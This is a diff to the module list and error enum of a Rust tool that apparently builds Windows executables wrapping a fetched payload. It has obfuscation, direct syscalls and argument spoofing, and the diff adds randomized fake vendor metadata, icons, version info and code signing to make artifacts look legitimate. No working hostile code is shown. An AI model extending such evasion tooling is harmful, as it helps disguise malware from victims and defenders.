@@ -8,14 +8,26 @@
 //! - `compiler`: stub compilation with `rustc`.
 //! - `fetch`: in-memory HTTP(S) fetch of the input payload (URL input).
 //! - `args`: payload command-line construction and argument spoofing.
+//! - `manifest`: the build manifest (provenance record written next to the
+//!   artifact).
+//! - `hash`: SHA-256 for provenance and payload pinning.
+//! - `identity`: plausible randomized metadata (company, product, versions).
+//! - `resources`: PE resources (icon, `VERSIONINFO`, application manifest)
+//!   built in Rust and written into a `.rsrc` section.
+//! - `signing`: optional Authenticode signing of the artifact via `signtool`.
 
 pub mod args;
 pub mod compiler;
 pub mod crypto;
 pub mod fetch;
+pub mod hash;
+pub mod identity;
 pub mod imports;
+pub mod manifest;
 pub mod obfuscation;
 pub mod pe;
+pub mod resources;
+pub mod signing;
 pub mod stub;
 pub mod syscalls;
 
@@ -36,7 +48,7 @@ pub enum BuildError {
 
     /// The `x86_64-pc-windows-gnu` cross-compilation target is not installed.
     #[error(
-        "Falta el target de cross-compile. Instálalo con:\n  rustup target add x86_64-pc-windows-gnu"
+        "the cross-compilation target is missing. Install it with:\n  rustup target add x86_64-pc-windows-gnu"
     )]
     MissingCrossTarget,
 
@@ -51,6 +63,18 @@ pub enum BuildError {
     /// The compiled stub is not a Windows PE (it lacks the `MZ` header).
     #[error("the compiled stub is not a Windows PE (missing 'MZ' header): {0}")]
     NotPeExecutable(String),
+
+    /// `rustc --version` could not be read (build provenance).
+    #[error("could not read the rustc version: {0}")]
+    RustcVersion(String),
+
+    /// The build manifest could not be serialized.
+    #[error("could not serialize the build manifest: {0}")]
+    Manifest(String),
+
+    /// PE resource embedding failed (icon, version info or manifest).
+    #[error("could not embed PE resources: {0}")]
+    Resource(#[from] resources::ResourceError),
 
     /// I/O error.
     #[error("I/O error: {0}")]
